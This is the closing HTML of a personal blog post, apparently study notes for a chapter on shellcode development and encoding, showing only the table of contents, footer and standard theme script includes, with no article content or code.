+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#notes-for-chapter3"><span class="nav-number">1.</span> <span class="nav-text">notes for chapter3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#from-3-2"><span class="nav-number">1.1.</span> <span class="nav-text">from 3.2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#问题描述："><span class="nav-number">1.1.1.</span> <span class="nav-text">问题描述：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解决方案："><span class="nav-number">1.1.2.</span> <span class="nav-text">解决方案：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-3-experiment"><span class="nav-number">1.2.</span> <span class="nav-text">3.2.3 experiment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#from-3-3"><span class="nav-number">1.3.</span> <span class="nav-text">from 3.3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#from-3-4-（通用shellcode开发）"><span class="nav-number">1.4.</span> <span class="nav-text">from 3.4 （通用shellcode开发）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#from-3-5-shellcode-编码技术"><span class="nav-number">1.5.</span> <span class="nav-text">from 3.5 shellcode 编码技术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#from-3-6"><span class="nav-number">1.6.</span> <span class="nav-text">from 3.6</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
